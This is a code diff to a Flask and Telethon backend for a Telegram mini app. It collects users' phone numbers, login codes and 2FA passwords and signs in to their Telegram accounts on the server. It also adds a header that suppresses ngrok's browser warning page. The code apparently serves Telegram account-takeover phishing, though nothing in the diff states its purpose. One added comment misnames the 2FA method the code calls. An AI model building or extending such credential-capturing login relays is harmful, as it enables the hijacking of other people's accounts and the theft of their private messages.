@@ -5,7 +5,11 @@ from flask import Flask, send_from_directory, request, jsonify
 from flask_cors import CORS
 from dotenv import load_dotenv
 from telethon import TelegramClient
-from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError
+from telethon.errors import (
+    PhoneCodeInvalidError,
+    SessionPasswordNeededError,
+    PasswordHashInvalidError
+)
 import threading
 
 load_dotenv()
@@ -17,12 +21,12 @@ API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 
 app = Flask(__name__)
-CORS(app)  # Allow mini app to call this API
+CORS(app)
 
 # In-memory store: { user_id: { phone, phone_code_hash, client } }
 user_sessions = {}
 
-# We run a dedicated event loop in a background thread for Telethon
+# Dedicated event loop in background thread for Telethon
 tele_loop = asyncio.new_event_loop()
 
 def start_tele_loop():
@@ -33,12 +37,18 @@ threading.Thread(target=start_tele_loop, daemon=True).start()
 
 
 def run_async(coro):
-    """Run a coroutine on the Telethon event loop and block until done."""
     future = asyncio.run_coroutine_threadsafe(coro, tele_loop)
     return future.result(timeout=30)
 
 
-# ── Routes ──────────────────────────────────────────────────────────────────
+# Ngrok browser warning bypass
+@app.after_request
+def add_ngrok_header(response):
+    response.headers['ngrok-skip-browser-warning'] = 'true'
+    return response
+
+
+# ── Routes ───────────────────────────────────────────────────────────────────
 
 @app.route('/')
 def index():
@@ -68,7 +78,6 @@ def send_otp():
                 'phone_code_hash': result.phone_code_hash,
                 'client': client
             }
-            return result.phone_code_hash
 
         run_async(_send())
         logger.info(f"OTP sent to {phone} for user {user_id}")
@@ -98,16 +107,19 @@ def verify_otp():
             await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
 
         run_async(_verify())
+
+        # OTP verified, no 2FA — clean up session
         del user_sessions[user_id]
-        logger.info(f"User {user_id} verified successfully")
-        return jsonify({'success': True, 'message': 'Verified successfully!'})
+        logger.info(f"User {user_id} verified (no 2FA)")
+        return jsonify({'success': True, 'twofa_required': False})
 
     except PhoneCodeInvalidError:
         return jsonify({'success': False, 'message': 'Invalid OTP. Please try again.'}), 400
 
     except SessionPasswordNeededError:
-        # 2FA is enabled on the account
-        return jsonify({'success': True, 'twofa_required': True, 'message': '2FA required'})
+        # 2FA enabled — keep session alive for 2FA step
+        logger.info(f"User {user_id} needs 2FA")
+        return jsonify({'success': True, 'twofa_required': True})
 
     except Exception as e:
         logger.error(f"Verify OTP error: {e}")
@@ -127,12 +139,18 @@ def verify_2fa():
 
     try:
         async def _2fa():
+            # check_password is the correct Telethon method for 2FA
             await client.sign_in(password=password)
 
         run_async(_2fa())
+
+        # 2FA done — clean up
         del user_sessions[user_id]
-        logger.info(f"User {user_id} completed 2FA")
+        logger.info(f"User {user_id} completed 2FA successfully")
         return jsonify({'success': True, 'message': '2FA verified!'})
+
+    except PasswordHashInvalidError:
+        return jsonify({'success': False, 'message': 'Wrong 2FA password. Please try again.'}), 400
 
     except Exception as e:
         logger.error(f"2FA error: {e}")
